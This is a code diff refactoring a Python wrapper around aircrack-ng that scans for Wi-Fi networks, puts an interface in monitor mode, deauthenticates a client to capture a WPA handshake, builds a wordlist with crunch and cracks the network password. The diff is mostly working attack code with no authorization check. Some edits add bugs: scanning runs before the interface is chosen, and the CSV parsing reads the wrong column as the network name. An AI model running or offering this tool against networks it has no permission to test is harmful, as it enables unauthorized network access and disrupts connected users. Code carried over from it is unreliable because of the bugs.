@@ -6,6 +6,7 @@ import logging
 import argparse
 from functools import wraps
 from pathlib import Path
+import csv
 
 # Setup logging with dynamic verbosity
 def setup_logging(verbose):
@@ -63,6 +64,7 @@ class CommandRunner:
 
 # Wrapper-class with wireless attacks and password cracking
 class AircrackNGWrapper:
+    
     def __init__(self, runner: CommandRunner):
         self.runner = runner
         self.interface = None
@@ -74,18 +76,11 @@ class AircrackNGWrapper:
         self.handshake_timeout = 120  # Timeout in seconds for handshake capture
 
     def configure(self, args):
-        self.interface = args.interface or self.auto_select_interface()
-        if not args.bssid:
+        if not args.bssid or not args.channel:
             self.list_networks()
-            self.bssid = self.get_input("Enter the BSSID of the target network")
-        else:
-            self.bssid = args.bssid
-        
-        if not args.channel:
-            self.channel = self.get_input("Enter the channel of the target network")
-        else:
-            self.channel = args.channel
-
+        self.interface = args.interface or self.select_option("Select the interface to use", self.get_interfaces())
+        self.bssid = args.bssid or self.bssid
+        self.channel = args.channel or self.channel
         self.capture_file = self.get_input("Enter the filename to save the capture", "capture")
 
         # Optional deauth attack
@@ -100,14 +95,6 @@ class AircrackNGWrapper:
         # Validate file paths
         self.validate_paths()
 
-    def auto_select_interface(self):
-        interfaces = self.get_interfaces()
-        if interfaces:
-            return interfaces[0]  # Automatically select the first available interface
-        else:
-            logging.error("No wireless interfaces found.")
-            exit(1)
-
     def validate_paths(self):
         if self.wordlist_path and not Path(self.wordlist_path).is_file():
             logging.error(f"Wordlist file '{self.wordlist_path}' does not exist.")
@@ -120,41 +107,14 @@ class AircrackNGWrapper:
 
     def get_interfaces(self):
         result = self.runner.run(['iwconfig'])
-        if result:
-            return [line.split()[0] for line in result.stdout.splitlines() if "IEEE 802.11" in line or "wlan" in line]
-        return []
+        return [line.split()[0] for line in result.stdout.splitlines() if "IEEE 802.11" in line or "wlan" in line]
 
-    def list_networks(self):
-        logging.info("Scanning for networks...")
-        cmd = ['sudo', 'airodump-ng', '--band', 'g', '--output-format', 'csv', '--write', 'temp_scan', self.interface]
-        result = self.runner.run(cmd, timeout=30)
-        if result:
-            networks = self.parse_networks_from_csv('temp_scan-01.csv')
-            self.bssid = self.select_network(networks)
-            self.channel = self.get_input("Enter the channel of the target network")
-        else:
-            logging.error("Failed to scan for networks.")
-            exit(1)
-
-    def parse_networks_from_csv(self, file_path):
-        networks = []
-        with open(file_path, 'r') as file:
-            for line in file:
-                if "BSSID" in line:
-                    continue
-                parts = line.split(';')
-                if len(parts) > 1:
-                    bssid = parts[0].strip()
-                    ssid = parts[13].strip()
-                    networks.append((bssid, ssid))
-        return networks
-
-    def select_network(self, networks):
-        print("Available networks:")
-        for idx, (bssid, ssid) in enumerate(networks):
-            print(f"{idx + 1}: BSSID: {bssid}, SSID: {ssid}")
-        choice = int(self.get_input(f"Select a network (1-{len(networks)}): ")) - 1
-        return networks[choice][0]
+    def select_option(self, prompt, options):
+        print(f"{prompt}:")
+        for idx, option in enumerate(options):
+            print(f"{idx + 1}: {option}")
+        choice = int(self.get_input(f"Select an option (1-{len(options)}): ")) - 1
+        return options[choice]
 
     @command_decorator("Monitor mode started", "Failed to start monitor mode")
     def start_monitor_mode(self):
@@ -172,6 +132,45 @@ class AircrackNGWrapper:
             return True
         return False
 
+    def list_networks(self):
+        logging.info("Scanning for networks...")
+        cmd = ['sudo', 'airodump-ng', '--band', 'g', '--output-format', 'csv', '--write', 'temp_scan', self.interface]
+        result = self.runner.run(cmd, timeout=60)  # Increased timeout for scanning
+        if result and result.returncode == 0:
+            networks = self.parse_networks_from_csv('temp_scan-01.csv')
+            if networks:
+                self.bssid = self.select_network(networks)
+                self.channel = self.get_input("Enter the channel of the target network")
+            else:
+                logging.error("No networks found. Ensure your wireless interface is in monitor mode.")
+                exit(1)
+        else:
+            logging.error("Failed to scan for networks. Check if your wireless interface is in monitor mode and if airodump-ng is installed correctly.")
+            exit(1)
+
+    def parse_networks_from_csv(self, csv_file):
+        networks = []
+        try:
+            with open(csv_file, 'r') as f:
+                reader = csv.reader(f)
+                for row in reader:
+                    if row and len(row) > 0:
+                        # Assuming BSSID is in the first column and ESSID is in the second
+                        bssid = row[0]
+                        essid = row[1]
+                        networks.append((bssid, essid))
+        except FileNotFoundError:
+            logging.error(f"CSV file {csv_file} not found.")
+        return networks
+
+    def select_network(self, networks):
+        print("Available networks:")
+        for idx, (bssid, essid) in enumerate(networks):
+            print(f"{idx + 1}: {bssid} ({essid})")
+        choice = int(self.get_input(f"Select a network (1-{len(networks)}): ")) - 1
+        selected_bssid = networks[choice][0]
+        return selected_bssid
+
     def capture_handshake(self):
         cmd = self.build_airodump_cmd()
         logging.info(f"Starting handshake capture on BSSID {self.bssid}, channel {self.channel}...")
@@ -181,8 +180,7 @@ class AircrackNGWrapper:
     def wait_for_handshake(self, process):
         start_time = time.time()
         while time.time() - start_time < self.handshake_timeout:
-            capture_file_path = f"{self.capture_file}-01.cap"
-            if os.path.exists(capture_file_path) and self.is_handshake_captured():
+            if os.path.exists(f"{self.capture_file}-01.cap") and self.is_handshake_captured():
                 logging.info("Handshake captured!")
                 process.terminate()
                 return True
@@ -194,23 +192,6 @@ class AircrackNGWrapper:
     def is_handshake_captured(self):
         result = self.runner.run(['aircrack-ng', '-a2', '-w', '/dev/null', f"{self.capture_file}-01.cap"])
         return result and "1 handshake" in result.stdout
-
-    def capture_clients(self):
-        """Capture connected clients from the airodump-ng output."""
-        cmd = ['sudo', 'airodump-ng', '--bssid', self.bssid, '--channel', self.channel, self.interface]
-        result = self.runner.run(cmd, timeout=30)  # Increased timeout
-        if result:
-            client_bssids = []
-            for line in result.stdout.splitlines():
-                if self.bssid in line and len(line.split()) > 1:
-                    client_bssids.append(line.split()[1])  # Assuming the second field contains the client BSSID
-            if client_bssids:
-                self.client_bssid = client_bssids[0]  # Automatically set the first client BSSID found
-                logging.info(f"Found client BSSID: {self.client_bssid}")
-            else:
-                logging.error("No clients found. Unable to perform deauth attack.")
-        else:
-            logging.error("Failed to capture clients.")
 
     def deauth_client(self):
         if not self.client_bssid:
@@ -235,60 +216,56 @@ class AircrackNGWrapper:
         charset = self.get_input("Enter the character set to use (e.g., abc123@)")
         output_file = self.get_input("Enter the file to save the generated wordlist", "wordlist.txt")
 
-        result = self.runner.run(['crunch', min_length, max_length, charset, '-o', output_file], timeout=300)
-        if self.runner.check(result, f"Wordlist generated and saved to {output_file}", "Error generating wordlist"):
+        result = self.runner.run(['crunch', min_length, max_length, charset, '-o', output_file])
+        if self.runner.check(result, "Wordlist generated successfully", "Failed to generate wordlist"):
             self.wordlist_path = output_file
 
+    def build_airodump_cmd(self):
+        return ['sudo', 'airodump-ng', '-c', self.channel, '--bssid', self.bssid, '--write', self.capture_file, self.interface]
+
     def crack_password(self):
-        capture_file = f"{self.capture_file}-01.cap"
-        if not Path(capture_file).is_file():
-            logging.error(f"Capture file '{capture_file}' not found.")
+        if not os.path.exists(f"{self.capture_file}-01.cap"):
+            logging.error(f"Capture file '{self.capture_file}-01.cap' does not exist.")
             exit(1)
 
-        if not self.wordlist_path:
-            logging.error("Wordlist path is not set.")
-            exit(1)
-
-        cmd = ['aircrack-ng', '-a2', '-w', self.wordlist_path, capture_file]
+        cmd = ['sudo', 'aircrack-ng', '-w', self.wordlist_path, f"{self.capture_file}-01.cap"]
+        logging.info(f"Starting password crack with wordlist '{self.wordlist_path}'...")
         result = self.runner.run(cmd)
-        if result:
-            logging.info(result.stdout)
+        if result and result.returncode == 0:
+            logging.info("Password cracking completed. Check the output for results.")
         else:
-            logging.error("Failed to crack the password.")
+            logging.error("Password cracking failed.")
+            exit(1)
 
     def get_input(self, prompt, default=None):
-        if default:
-            prompt = f"{prompt} (default: {default})"
-        else:
-            prompt = f"{prompt}:"
-        user_input = input(prompt).strip()
-        return user_input or default
+        user_input = input(f"{prompt} [{default}]: ") or default
+        return user_input
 
-    def build_airodump_cmd(self):
-        return [
-            'sudo', 'airodump-ng', '--bssid', self.bssid, '--channel', self.channel, 
-            '--write', self.capture_file, self.interface
-        ]
-
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Aircrack-ng Wrapper Script")
-    parser.add_argument('--interface', help='Wireless interface to use')
-    parser.add_argument('--bssid', help='BSSID of the target network')
-    parser.add_argument('--channel', help='Channel of the target network')
-    parser.add_argument('--wordlist', help='Path to the wordlist file')
-    parser.add_argument('--crunch', action='store_true', help='Generate wordlist using crunch')
-    parser.add_argument('--client-bssid', help='BSSID of a connected client for deauth attack')
-    parser.add_argument('--verbose', action='store_true', help='Enable verbose logging')
+def main():
+    parser = argparse.ArgumentParser(description="Aircrack-ng wrapper script")
+    parser.add_argument('-i', '--interface', help="Wireless interface to use")
+    parser.add_argument('-b', '--bssid', help="BSSID of the target network")
+    parser.add_argument('-c', '--channel', help="Channel of the target network")
+    parser.add_argument('-w', '--wordlist', help="Path to existing wordlist file")
+    parser.add_argument('--crunch', action='store_true', help="Generate wordlist with crunch")
+    parser.add_argument('-a', '--client-bssid', help="BSSID of the client to deauth")
+    parser.add_argument('-v', '--verbose', action='store_true', help="Enable verbose output")
     args = parser.parse_args()
 
     setup_logging(args.verbose)
     runner = CommandRunner(verbose=args.verbose)
     aircrack_wrapper = AircrackNGWrapper(runner)
+
     aircrack_wrapper.configure(args)
     aircrack_wrapper.start_monitor_mode()
-    if aircrack_wrapper.verify_monitor_mode():
-        aircrack_wrapper.capture_handshake()
-        aircrack_wrapper.capture_clients()
-        aircrack_wrapper.deauth_client()
-        aircrack_wrapper.crack_password()
+    if not aircrack_wrapper.verify_monitor_mode():
+        logging.error("Interface is not in monitor mode. Exiting.")
+        exit(1)
+    
+    aircrack_wrapper.capture_handshake()
+    aircrack_wrapper.deauth_client()
+    aircrack_wrapper.crack_password()
     aircrack_wrapper.stop_monitor_mode()
+
+if __name__ == "__main__":
+    main()
